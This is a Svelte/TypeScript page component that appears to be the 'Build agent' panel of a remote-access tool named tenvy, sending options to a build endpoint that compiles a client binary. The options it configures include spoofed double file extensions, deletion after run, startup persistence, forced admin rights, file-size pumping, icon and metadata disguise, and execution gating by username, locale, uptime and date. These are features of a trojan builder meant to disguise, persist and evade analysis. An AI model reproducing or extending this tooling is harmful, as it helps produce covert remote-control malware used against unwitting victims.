<script lang="ts">
	import { browser } from '$app/environment';
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
	import { onDestroy, onMount, tick } from 'svelte';
	import { SvelteSet } from 'svelte/reactivity';
	import { toast } from 'svelte-sonner';
	import ConnectionTab from './components/ConnectionTab.svelte';
	import {
		ANTI_TAMPER_BADGES,
		ARCHITECTURE_OPTIONS_BY_OS,
		DEFAULT_FILE_INFORMATION,
		EXTENSION_OPTIONS_BY_OS,
		EXTENSION_SPOOF_PRESETS,
		type CookieKV,
		type ExtensionSpoofPreset,
		type FilePumperUnit,
		type HeaderKV,
		type TargetArch,
		type TargetOS
	} from './lib/constants.js';
	import {
		addCustomCookie as createCustomCookie,
		addCustomHeader as createCustomHeader,
		generateMutexName as randomMutexSuffix,
		normalizeSpoofExtension,
		removeCustomCookie as deleteCustomCookie,
		removeCustomHeader as deleteCustomHeader,
		sanitizeMutexName,
		updateCustomCookie as writeCustomCookie,
		updateCustomHeader as writeCustomHeader,
		validateSpoofExtension,
		withPresetSpoofExtension
	} from './lib/utils.js';
	import { prepareBuildRequest } from './lib/build-request.js';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
		sharedSecret?: string;
		warnings?: string[];
	};

	let host = $state('localhost');
	let port = $state('2332');
	let outputFilename = $state('tenvy-client');
	let targetOS = $state<TargetOS>('windows');
	let targetArch = $state<TargetArch>('amd64');
	let outputExtension = $state(EXTENSION_OPTIONS_BY_OS.windows[0]);
	let extensionSpoofingEnabled = $state(false);
	let extensionSpoofPreset = $state<ExtensionSpoofPreset>(EXTENSION_SPOOF_PRESETS[0]);
	let extensionSpoofCustom = $state('');
	let extensionSpoofError = $state<string | null>(null);
	let installationPath = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);
	let developerMode = $state(true);
	let mutexName = $state('');
	let compressBinary = $state(false);
	let forceAdmin = $state(false);
	let fileIconName = $state<string | null>(null);
	let fileIconData = $state<string | null>(null);
	let fileIconError = $state<string | null>(null);
	let buildWarnings = $state<string[]>([]);
	let pollIntervalMs = $state('');
	let maxBackoffMs = $state('');
	let shellTimeoutSeconds = $state('');
	let fileInformation = $state({ ...DEFAULT_FILE_INFORMATION });
	let fileInformationOpen = $state(false);
	let watchdogEnabled = $state(false);
	let watchdogIntervalSeconds = $state('60');
	let enableFilePumper = $state(false);
	let filePumperTargetSize = $state('');
	let filePumperUnit = $state<FilePumperUnit>('MB');
	let executionDelaySeconds = $state('');
	let executionAllowedUsernames = $state('');
	let executionAllowedLocales = $state('');
	let executionMinUptimeMinutes = $state('');
	let executionStartDate = $state('');
	let executionEndDate = $state('');
	let executionRequireInternet = $state(true);
	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
	let audioStreamingEnabled = $state(false);
	let audioStreamingTouched = $state(false);
	type BuildTab = 'connection' | 'persistence' | 'execution' | 'presentation';
	const DEFAULT_TAB: BuildTab = 'connection';
	let activeTab = $state<BuildTab>(DEFAULT_TAB);

	type TabComponent = typeof ConnectionTab;
	type TabLoader = () => Promise<{ default: TabComponent }>;

	const TAB_COMPONENT_LOADERS: Record<BuildTab, TabLoader> = {
		connection: async () => ({ default: ConnectionTab }),
		persistence: () => import('./components/PersistenceTab.svelte'),
		execution: () => import('./components/ExecutionTab.svelte'),
		presentation: () => import('./components/PresentationTab.svelte')
	};

	let tabComponents = $state<Partial<Record<BuildTab, TabComponent>>>({
		connection: ConnectionTab
	});
	let tabLoading = $state<Record<BuildTab, boolean>>({
		connection: false,
		persistence: false,
		execution: false,
		presentation: false
	});
	let tabErrors = $state<Record<BuildTab, string | null>>({
		connection: null,
		persistence: null,
		execution: null,
		presentation: null
	});

	async function loadTabComponent(tab: BuildTab) {
		if (tabComponents[tab]) {
			tabErrors = { ...tabErrors, [tab]: null };
			return tabComponents[tab];
		}

		if (tabLoading[tab]) {
			return;
		}

		tabLoading = { ...tabLoading, [tab]: true };
		tabErrors = { ...tabErrors, [tab]: null };

		try {
			const module = await TAB_COMPONENT_LOADERS[tab]();
			tabComponents = { ...tabComponents, [tab]: module.default };
			return module.default;
		} catch (error) {
			console.error('Failed to load tab component', tab, error);
			const message =
				error instanceof Error ? error.message : 'Failed to load tab. Please try again.';
			tabErrors = { ...tabErrors, [tab]: message };
		} finally {
			tabLoading = { ...tabLoading, [tab]: false };
		}
	}

	function prefetchDefaultTab() {
		if (!tabComponents[DEFAULT_TAB]) {
			return loadTabComponent(DEFAULT_TAB);
		}

		return Promise.resolve(tabComponents[DEFAULT_TAB]);
	}

	const idleApi = globalThis as typeof globalThis & {
		requestIdleCallback?: (callback: IdleRequestCallback, options?: IdleRequestOptions) => number;
		cancelIdleCallback?: (handle: number) => void;
	};

	let idlePrefetchHandle: number | null = null;
	let idlePrefetchTimeout: ReturnType<typeof setTimeout> | null = null;

	function scheduleIdlePrefetch() {
		const runPrefetch = () => {
			(['persistence', 'execution', 'presentation'] satisfies BuildTab[]).forEach((tab) => {
				void loadTabComponent(tab);
			});
		};

		if (typeof idleApi.requestIdleCallback === 'function') {
			idlePrefetchHandle = idleApi.requestIdleCallback(() => {
				idlePrefetchHandle = null;
				runPrefetch();
			});
			return;
		}

		idlePrefetchTimeout = setTimeout(() => {
			idlePrefetchTimeout = null;
			runPrefetch();
		});
	}

	if (browser) {
		onMount(() => {
			prefetchDefaultTab()
				.catch(() => undefined)
				.then(() => {
					scheduleIdlePrefetch();
				});
		});
	}

	onDestroy(() => {
		if (idlePrefetchHandle !== null && typeof idleApi.cancelIdleCallback === 'function') {
			idleApi.cancelIdleCallback(idlePrefetchHandle);
			idlePrefetchHandle = null;
		}

		if (idlePrefetchTimeout !== null) {
			clearTimeout(idlePrefetchTimeout);
			idlePrefetchTimeout = null;
		}
	});

	const KNOWN_EXTENSION_SUFFIXES = Array.from(
		new Set(
			Object.values(EXTENSION_OPTIONS_BY_OS)
				.flat()
				.map((extension) => extension.toLowerCase())
		)
	);

	const SPOOF_PRESET_SUFFIXES = EXTENSION_SPOOF_PRESETS.map((preset) => preset.toLowerCase());

	const activeSpoofExtension = $derived(
		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
	);

	const sanitizedOutputBase = $derived.by(() => {
		const trimmed = outputFilename.trim();
		if (!trimmed) {
			return 'tenvy-client';
		}

		let working = trimmed;
		let normalized = working.toLowerCase();

		const targetExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? [];
		const normalizedCustomSpoof = normalizeSpoofExtension(extensionSpoofCustom)?.toLowerCase();

		const suffixes = [
			activeSpoofExtension.toLowerCase(),
			normalizedCustomSpoof,
			...SPOOF_PRESET_SUFFIXES,
			...targetExtensions.map((extension) => extension.toLowerCase()),
			...KNOWN_EXTENSION_SUFFIXES
		];

		const seen = new SvelteSet<string>();
		for (const suffix of suffixes) {
			if (!suffix || seen.has(suffix)) {
				continue;
			}
			seen.add(suffix);

			while (normalized.endsWith(suffix)) {
				working = working.slice(0, -suffix.length);
				normalized = working.toLowerCase();
			}
		}

		const sanitized = working
			.replace(/[^A-Za-z0-9._-]/g, '_')
			.replace(/\.+$/, '')
			.trim();

		return sanitized || 'tenvy-client';
	});

	const effectiveOutputFilename = $derived(
		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
	);

	const isWindowsTarget = $derived(targetOS === 'windows');

	let buildStatus = $state<BuildStatus>('idle');
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);

	const BUILD_STATUS_TOAST_ID = 'build-status-toast';
	const BUILD_PROGRESS_TOAST_ID = 'build-progress-toast';

	function clearBuildToasts() {
		if (!browser) {
			return;
		}

		toast.dismiss(BUILD_STATUS_TOAST_ID);
		toast.dismiss(BUILD_PROGRESS_TOAST_ID);
	}

	let lastToastedStatus: BuildStatus = 'idle';
	let lastWarningSignature = '';

	let isBuilding = $derived(buildStatus === 'running');

	if (browser) {
		onMount(() => {
			void prefetchDefaultTab();
		});
	} else {
		void prefetchDefaultTab();
	}

	$effect(() => {
		void loadTabComponent(activeTab);
	});

	const markAudioStreamingTouched = () => {
		audioStreamingTouched = true;
	};

	$effect(() => {
		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
		if (!allowedExtensions.includes(outputExtension)) {
			outputExtension = allowedExtensions[0];
		}
	});

	$effect(() => {
		const archOptions = ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? ARCHITECTURE_OPTIONS_BY_OS.windows;
		if (!archOptions.some((option) => option.value === targetArch)) {
			targetArch = archOptions[0]?.value ?? 'amd64';
		}
	});

	$effect(() => {
		if (!isWindowsTarget) {
			fileIconName = null;
			fileIconData = null;
			fileIconError = null;
			fileInformation = { ...DEFAULT_FILE_INFORMATION };
		}
	});

	$effect(() => {
		if (!extensionSpoofingEnabled) {
			extensionSpoofError = null;
			return;
		}

		extensionSpoofError = validateSpoofExtension(extensionSpoofCustom) ?? null;
	});

	$effect(() => {
		if (!browser) {
			return;
		}

		const status = buildStatus;

		if (status === 'idle') {
			if (lastToastedStatus !== 'idle') {
				toast.dismiss(BUILD_STATUS_TOAST_ID);
			}
			lastToastedStatus = status;
			return;
		}

		if (status === lastToastedStatus) {
			return;
		}

		if (status === 'running') {
			toast.loading('Starting build…', {
				id: BUILD_STATUS_TOAST_ID,
				description: `Generating ${effectiveOutputFilename}`,
				position: 'bottom-right',
				duration: Number.POSITIVE_INFINITY,
				dismissable: false
			});
		} else if (status === 'success') {
			const parts: string[] = [];
			if (downloadUrl) {
				parts.push('Download is ready.');
			}
			if (outputPath) {
				parts.push(`Saved to ${outputPath}.`);
			}
			const url = downloadUrl;
			const action = url
				? {
						label: 'Download',
						onClick: () => {
							if (typeof window !== 'undefined') {
								window.open(url, '_blank', 'noopener');
							}
						}
					}
				: undefined;
			toast.success('Build completed', {
				id: BUILD_STATUS_TOAST_ID,
				description: parts.length > 0 ? parts.join(' ') : 'Agent binary is ready to deploy.',
				position: 'bottom-right',
				action
			});
		} else if (status === 'error') {
			toast.error(buildError ?? 'Failed to build agent.', {
				id: BUILD_STATUS_TOAST_ID,
				position: 'bottom-right'
			});
		}

		lastToastedStatus = status;
	});

	$effect(() => {
		if (!browser) {
			return;
		}

		if (buildStatus !== 'success') {
			lastWarningSignature = '';
			return;
		}

		if (!buildWarnings.length) {
			lastWarningSignature = '';
			return;
		}

		const signature = buildWarnings.join('\u0000');
		if (signature === lastWarningSignature) {
			return;
		}

		for (const warning of buildWarnings) {
			toast('Build warning', {
				description: warning,
				position: 'bottom-right'
			});
		}

		lastWarningSignature = signature;
	});

	function resetProgress() {
		buildStatus = 'idle';
		buildError = null;
		downloadUrl = null;
		outputPath = null;
		buildWarnings = [];
		fileIconError = null;
		clearBuildToasts();
	}

	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
		if (!browser) {
			return;
		}

		const options = { position: 'bottom-right' as const };
		if (tone === 'success') {
			toast.dismiss(BUILD_PROGRESS_TOAST_ID);
			toast.success(text, options);
			return;
		}

		if (tone === 'error') {
			toast.dismiss(BUILD_PROGRESS_TOAST_ID);
			return;
		}

		toast(text, { ...options, id: BUILD_PROGRESS_TOAST_ID, dismissable: false });
	}

	function notifySharedSecret(secret: string | null) {
		if (!browser) {
			return;
		}

		if (!secret) {
			return;
		}

		toast('Generated shared secret', {
			description: secret,
			position: 'bottom-right',
			duration: Number.POSITIVE_INFINITY,
			dismissable: true,
			action: {
				label: 'Copy',
				onClick: async () => {
					if (typeof navigator === 'undefined' || !navigator.clipboard) {
						toast.error('Clipboard is unavailable', { position: 'bottom-right' });
						return;
					}

					try {
						await navigator.clipboard.writeText(secret);
						toast.success('Secret copied', { position: 'bottom-right' });
					} catch (error) {
						const message = error instanceof Error ? error.message : 'Failed to copy secret.';
						toast.error(message, { position: 'bottom-right' });
					}
				}
			}
		});
	}

	function applyInstallationPreset(preset: string) {
		installationPath = preset;
	}

	function addCustomHeader() {
		customHeaders = createCustomHeader(customHeaders);
	}

	function updateCustomHeader(index: number, key: keyof HeaderKV, value: string) {
		customHeaders = writeCustomHeader(customHeaders, index, key, value);
	}

	function removeCustomHeader(index: number) {
		const updated = deleteCustomHeader(customHeaders, index);
		customHeaders = updated.length > 0 ? updated : [{ key: '', value: '' }];
	}

	function addCustomCookie() {
		customCookies = createCustomCookie(customCookies);
	}

	function updateCustomCookie(index: number, key: keyof CookieKV, value: string) {
		customCookies = writeCustomCookie(customCookies, index, key, value);
	}

	function removeCustomCookie(index: number) {
		const updated = deleteCustomCookie(customCookies, index);
		customCookies = updated.length > 0 ? updated : [{ name: '', value: '' }];
	}

	function assignMutexName(length = 16) {
		const suffix = randomMutexSuffix(length).toUpperCase();
		mutexName = sanitizeMutexName(`Global\\tenvy-${suffix}`);
	}

	async function handleIconSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		fileIconError = null;

		if (!file) {
			fileIconName = null;
			fileIconData = null;
			return;
		}

		if (file.size > 512 * 1024) {
			fileIconError = 'Icon file must be 512KB or smaller.';
			fileIconName = null;
			fileIconData = null;
			return;
		}

		try {
			const dataUrl = await new Promise<string>((resolve, reject) => {
				const reader = new FileReader();

				reader.onerror = () => {
					const error = reader.error;
					reject(error ?? new Error('Failed to read icon file.'));
				};

				reader.onload = () => {
					const result = reader.result;

					if (typeof result !== 'string') {
						reject(new Error('Failed to read icon file.'));
						return;
					}

					const base64 = result.replace(/^data:[^;]*;base64,/, '');
					resolve(base64);
				};

				reader.readAsDataURL(file);
			});

			fileIconData = dataUrl;
			fileIconName = file.name;
		} catch (err) {
			fileIconError = err instanceof Error ? err.message : 'Failed to read icon file.';
			fileIconName = null;
			fileIconData = null;
		}
	}

	function clearIconSelection() {
		fileIconName = null;
		fileIconData = null;
		fileIconError = null;
	}

	async function buildAgent() {
		if (buildStatus === 'running') {
			return;
		}

		resetProgress();

		const buildResult = prepareBuildRequest({
			host,
			port,
			effectiveOutputFilename,
			outputExtension,
			targetOS,
			targetArch,
			installationPath,
			meltAfterRun,
			startupOnBoot,
			developerMode,
			mutexName,
			compressBinary,
			forceAdmin,
			pollIntervalMs,
			maxBackoffMs,
			shellTimeoutSeconds,
			customHeaders,
			customCookies,
			watchdogEnabled,
			watchdogIntervalSeconds,
			enableFilePumper,
			filePumperTargetSize,
			filePumperUnit,
			executionDelaySeconds,
			executionMinUptimeMinutes,
			executionAllowedUsernames,
			executionAllowedLocales,
			executionStartDate,
			executionEndDate,
			executionRequireInternet,
			audioStreamingTouched,
			audioStreamingEnabled,
			fileIconName,
			fileIconData,
			fileInformation,
			isWindowsTarget
		});

		if (!buildResult.ok) {
			buildError = buildResult.error;
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			return;
		}

		const { payload, warnings: preflightWarnings } = buildResult;

		buildWarnings = [...preflightWarnings];
		buildStatus = 'running';
		await tick();
		pushProgress('Preparing build request...');

		try {
			pushProgress('Dispatching build to compiler environment...');
			const response = await fetch('/api/build', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});

			const result = (await response.json()) as BuildResponse;
			const responseWarnings = result.warnings ?? [];
			buildWarnings = [...preflightWarnings, ...responseWarnings];

			if (!response.ok || !result.success) {
				const message = result.message || 'Failed to build agent.';
				throw new Error(message);
			}

			pushProgress('Compilation completed. Finalizing artifacts...');

			downloadUrl = result.downloadUrl ?? null;
			outputPath = result.outputPath ?? null;

			buildStatus = 'success';
			pushProgress('Agent binary is ready.', 'success');
			notifySharedSecret(result.sharedSecret ?? null);
		} catch (err) {
			buildStatus = 'error';
			buildError = err instanceof Error ? err.message : 'Unknown build error.';
			pushProgress(buildError, 'error');
		}
	}

	onDestroy(() => {
		clearBuildToasts();
	});
</script>

<div class="mx-auto w-full space-y-6 px-4 pb-10">
	<Card>
		<CardHeader class="space-y-4">
			<div class="flex flex-wrap items-center justify-between gap-3">
				<div class="space-y-1">
					<CardTitle>Build agent</CardTitle>
					<CardDescription>
						Configure connection and persistence options, then generate a customized client binary.
					</CardDescription>
				</div>
				<div class="flex flex-wrap gap-2">
					{#each ANTI_TAMPER_BADGES as badge (badge)}
						<Badge
							variant="outline"
							class="border-emerald-500/40 bg-emerald-500/10 text-[0.65rem] font-medium tracking-wide text-emerald-600 uppercase"
						>
							{badge}
						</Badge>
					{/each}
				</div>
			</div>
			<p class="text-xs text-muted-foreground">
				These safeguards are always embedded into generated builds. Customize the remaining options
				to match your delivery strategy.
			</p>
		</CardHeader>
		<CardContent class="space-y-8">
			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
				<div class="space-y-8">
					<Tabs bind:value={activeTab} class="space-y-6">
						<TabsList
							class="flex w-full flex-wrap gap-2 rounded-lg border border-border/70 bg-muted/40 p-1"
						>
							<TabsTrigger value="connection" class="flex-1 sm:flex-none">Connection</TabsTrigger>
							<TabsTrigger value="persistence" class="flex-1 sm:flex-none">Persistence</TabsTrigger>
							<TabsTrigger value="execution" class="flex-1 sm:flex-none">Execution</TabsTrigger>
							<TabsTrigger value="presentation" class="flex-1 sm:flex-none"
								>Presentation</TabsTrigger
							>
						</TabsList>

						<TabsContent value="connection" class="space-y-6">
							{#if tabComponents.connection}
								<svelte:component
									this={tabComponents.connection}
									bind:host
									bind:port
									bind:outputFilename
									{effectiveOutputFilename}
									bind:targetOS
									bind:targetArch
									bind:outputExtension
									bind:extensionSpoofingEnabled
									bind:extensionSpoofPreset
									bind:extensionSpoofCustom
									{extensionSpoofError}
									bind:pollIntervalMs
									bind:maxBackoffMs
									bind:shellTimeoutSeconds
									{customHeaders}
									{customCookies}
									bind:audioStreamingEnabled
									{audioStreamingTouched}
									{markAudioStreamingTouched}
									{addCustomHeader}
									{updateCustomHeader}
									{removeCustomHeader}
									{addCustomCookie}
									{updateCustomCookie}
									{removeCustomCookie}
								/>
							{:else if tabErrors.connection}
								<p class="text-sm text-destructive">
									{tabErrors.connection}
								</p>
							{:else}
								<p class="text-xs text-muted-foreground">Loading connection options…</p>
							{/if}
						</TabsContent>
						<TabsContent value="persistence" class="space-y-6">
							{#if tabComponents.persistence}
								<svelte:component
									this={tabComponents.persistence}
									bind:installationPath
									bind:mutexName
									bind:meltAfterRun
									bind:startupOnBoot
									bind:developerMode
									bind:compressBinary
									bind:forceAdmin
									bind:watchdogEnabled
									bind:watchdogIntervalSeconds
									bind:enableFilePumper
									bind:filePumperTargetSize
									bind:filePumperUnit
									{applyInstallationPreset}
									{assignMutexName}
								/>
							{:else if tabErrors.persistence}
								<p class="text-sm text-destructive">
									{tabErrors.persistence}
								</p>
							{:else}
								<p class="text-xs text-muted-foreground">Loading persistence options…</p>
							{/if}
						</TabsContent>
						<TabsContent value="execution" class="space-y-6">
							{#if tabComponents.execution}
								<svelte:component
									this={tabComponents.execution}
									bind:executionDelaySeconds
									bind:executionMinUptimeMinutes
									bind:executionAllowedUsernames
									bind:executionAllowedLocales
									bind:executionStartDate
									bind:executionEndDate
									bind:executionRequireInternet
								/>
							{:else if tabErrors.execution}
								<p class="text-sm text-destructive">
									{tabErrors.execution}
								</p>
							{:else}
								<p class="text-xs text-muted-foreground">Loading execution options…</p>
							{/if}
						</TabsContent>
						<TabsContent value="presentation" class="space-y-6">
							{#if tabComponents.presentation}
								<svelte:component
									this={tabComponents.presentation}
									{fileIconName}
									{fileIconError}
									{handleIconSelection}
									{clearIconSelection}
									{isWindowsTarget}
									bind:fileInformationOpen
									{fileInformation}
								/>
							{:else if tabErrors.presentation}
								<p class="text-sm text-destructive">
									{tabErrors.presentation}
								</p>
							{:else}
								<p class="text-xs text-muted-foreground">Loading presentation options…</p>
							{/if}
						</TabsContent>
					</Tabs>
				</div>
				<aside class="space-y-4 xl:sticky xl:top-24">
					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="space-y-2">
							<h3 class="text-sm font-semibold">Ready to build?</h3>
							<p class="text-xs text-muted-foreground">
								Provide a host and port to embed defaults inside the generated binary. Additional
								preferences are stored for the agent to consume on first launch.
							</p>
						</div>
						<Button type="button" class="w-full" disabled={isBuilding} onclick={buildAgent}>
							{isBuilding ? 'Building…' : 'Build Agent'}
						</Button>
					</div>
				</aside>
			</div>
		</CardContent>
	</Card>
</div>
